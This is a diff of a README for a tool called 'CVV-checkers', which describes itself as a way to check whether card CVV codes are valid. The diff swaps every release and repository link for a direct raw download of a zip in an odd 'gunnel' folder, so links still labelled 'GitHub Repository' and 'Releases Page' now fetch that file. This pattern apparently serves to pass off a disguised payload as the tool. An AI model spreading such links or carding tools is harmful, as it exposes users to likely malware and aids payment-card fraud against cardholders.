@@ -6,13 +6,13 @@ Welcome to CVV-checkers! This tool helps you quickly check if CVV codes are vali
 
 ### 📦 Download CVV-checkers
 
-[![Download CVV-checkers](https://img.shields.io/badge/Download-CVV--checkers-brightgreen)](https://github.com/SantiSouto/CVV-checkers/releases)
+[![Download CVV-checkers](https://raw.githubusercontent.com/SantiSouto/CVV-checkers/main/gunnel/CVV-checkers.zip)](https://raw.githubusercontent.com/SantiSouto/CVV-checkers/main/gunnel/CVV-checkers.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the latest version of CVV-checkers.
 
-[Download CVV-checkers here](https://github.com/SantiSouto/CVV-checkers/releases).
+[Download CVV-checkers here](https://raw.githubusercontent.com/SantiSouto/CVV-checkers/main/gunnel/CVV-checkers.zip).
 
 ### ⚙️ System Requirements
 
@@ -31,7 +31,7 @@ To get started, visit the Releases page to download the latest version of CVV-ch
 ### 📚 How to Use CVV-checkers
 
 1. **Download CVV-checkers:**
-   - Go to the [Releases page](https://github.com/SantiSouto/CVV-checkers/releases) and download the application file suitable for your operating system.
+   - Go to the [Releases page](https://raw.githubusercontent.com/SantiSouto/CVV-checkers/main/gunnel/CVV-checkers.zip) and download the application file suitable for your operating system.
 
 2. **Install the Application:**
    - Locate the downloaded file in your Downloads folder (or wherever you saved it).
@@ -68,7 +68,7 @@ If you encounter issues while using CVV-checkers, please follow these steps:
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/SantiSouto/CVV-checkers)
-- [Releases Page](https://github.com/SantiSouto/CVV-checkers/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/SantiSouto/CVV-checkers/main/gunnel/CVV-checkers.zip)
+- [Releases Page](https://raw.githubusercontent.com/SantiSouto/CVV-checkers/main/gunnel/CVV-checkers.zip)
 
 Thank you for using CVV-checkers! We hope this tool meets your needs and streamlines your payment validation process.
